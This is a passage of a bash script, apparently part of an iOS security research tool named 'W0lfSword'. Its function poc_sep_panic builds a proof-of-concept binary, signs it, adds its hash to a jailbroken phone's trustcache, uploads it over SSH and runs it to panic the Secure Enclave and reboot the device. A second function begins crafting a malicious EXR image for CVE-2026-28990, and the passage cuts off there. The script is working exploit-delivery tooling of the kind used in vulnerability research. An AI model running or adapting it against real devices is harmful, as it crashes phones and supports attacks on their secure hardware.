poc_sep_panic() {
    local ip; ip=$(poc_require_device "$1") || return 1
    poc_warn
    confirm "This WILL panic the SEP and reboot the phone. Continue?" || { err "Aborted"; return 1; }

    stage "1/3" "Building sep_panic tool (Theos)..."
    check_theos || { err "THEOS not set  -  run: sudo ./W0lfSword setup"; hint "The tool builds on this computer with the same toolchain as the tweak."; return 1; }
    local build_log; build_log=$(cd "$POC_DIR/sep_panic" && make 2>&1)
    local ec=$?
    $VERBOSE && echo "$build_log" | tail -8
    if [ $ec -ne 0 ]; then
        crit "sep_panic build failed (exit=$ec)"
        hint "Run './W0lfSword doctor'  -  it's almost always THEOS or the SDK."
        return 1
    fi
    local bin; bin=$(find "$POC_DIR/sep_panic/.theos" -type f -name sep_panic 2>/dev/null | head -1)
    [ -n "$bin" ] || { err "Built binary not found  -  check .theos output"; return 1; }
    ok "Built $(basename "$bin") ($(du -h "$bin" | cut -f1))"

    stage "2/3" "Uploading to root@$ip..."
    # Dopamine rootless kills unsigned/adhoc Theos binaries at exec
    # (SIGKILL, no .ips)  -  sign with ldid + register cdhash via jbctl.
    # Proven recipe: pocs/imgio_probe + `fuzz probe` (K4.13).
    local ldid=""; [ -x "$PROJECT_DIR/scripts/ldid" ] && ldid="$PROJECT_DIR/scripts/ldid"
    command -v ldid >/dev/null 2>&1 && ldid="$(command -v ldid)"
    if [ -n "$ldid" ]; then
        "$ldid" -S "$bin" 2>/dev/null
        local ch; ch=$("$ldid" -h "$bin" 2>/dev/null | grep -oE "CandidateCDHash sha256=[a-f0-9]+" | awk -F= '{print $2}')
        if [ -n "$ch" ]; then
            if ssh_safe "root@$ip" "[ -x /var/jb/usr/bin/jbctl ] && /var/jb/usr/bin/jbctl trustcache add $ch" 2>/dev/null; then
                ok "signed + trustcache added ($ch)"
            else
                warn "sign ok but trustcache add failed  -  exec may be killed"
            fi
        else
            warn "cdhash extraction failed  -  binary may not exec"
        fi
    else
        warn "ldid not found (scripts/ldid)  -  binary may not exec on rootless"
    fi
    retry 3 1 scp_safe "$bin" "root@$ip:/tmp/sep_panic" || { err "SCP failed after 3 retries"; return 1; }

    stage "3/3" "Arming crash-monitor + firing..."
    crash_monitor "$ip" "$DATA_DIR/poc_sep_panic.log"
    echo -e "  ${C_AMB}${B}Firing  -  the SSH session drops when the SEP panics (~call 41).${NC}"
    ssh_safe "root@$ip" "chmod +x /tmp/sep_panic && /tmp/sep_panic" 2>/dev/null || true
    echo ""
    echo -e "  ${C_GRN}${B}PoC fired.${NC} The phone should now reboot itself."
    echo -e "  ${C_DIM}Expected panic: 'SEP Panic: :sks /sks : 0x0006fea7' (fixed address, no SEP ASLR).${NC}"
    echo -e "  ${C_DIM}Check the run: ${C_FROST}./W0lfSword crashlog${NC}  -  look for 'CONNECTION LOST', then verify the reboot.${NC}"
    echo ""
}

poc_exr() {
    local ip; ip=$(poc_require_device "$1") || return 1
    poc_warn
    confirm "This will crash the decode process (device survives). Continue?" || { err "Aborted"; return 1; }

    stage "1/3" "Generating crafted EXR (CVE-2026-28990)..."
